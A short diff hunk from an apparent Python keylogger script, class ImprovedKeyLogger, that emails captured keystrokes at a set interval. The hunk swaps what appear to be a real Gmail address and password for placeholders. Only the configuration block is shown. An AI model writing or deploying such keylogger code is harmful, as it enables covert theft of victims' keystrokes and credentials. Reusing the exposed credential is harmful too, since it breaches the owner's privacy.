@@ -55,8 +55,8 @@ class ImprovedKeyLogger:
 
 if __name__ == "__main__":
     # Example usage
-    target_email_address = "bendada.ouss01@gmail.com"
-    sender_email_password = "molxnircjdfkbshp"
+    target_email_address = "your_email@gmail.com"
+    sender_email_password = "your_password"
     reporting_interval_seconds = 60  # Set the interval in seconds
 
     logger = ImprovedKeyLogger(reporting_interval_seconds, target_email_address, sender_email_password)
